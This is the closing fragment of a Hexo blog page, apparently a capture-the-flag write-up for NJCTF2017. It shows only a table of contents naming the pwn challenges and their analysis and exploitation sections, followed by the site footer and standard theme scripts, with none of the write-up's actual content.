+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NJCTF2017"><span class="nav-number">1.</span> <span class="nav-text">NJCTF2017</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn-messager"><span class="nav-number">1.1.</span> <span class="nav-text">pwn-messager</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题目分析"><span class="nav-number">1.1.1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用思路"><span class="nav-number">1.1.2.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过程记录"><span class="nav-number">1.1.3.</span> <span class="nav-text">过程记录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.1.4.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn-pingme"><span class="nav-number">1.2.</span> <span class="nav-text">pwn-pingme</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序分析"><span class="nav-number">1.2.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用思路-1"><span class="nav-number">1.2.2.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#233"><span class="nav-number">1.3.</span> <span class="nav-text">233</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#题目分析-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用-直接爆破"><span class="nav-number">1.3.2.</span> <span class="nav-text">漏洞利用-直接爆破</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">e3pem</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
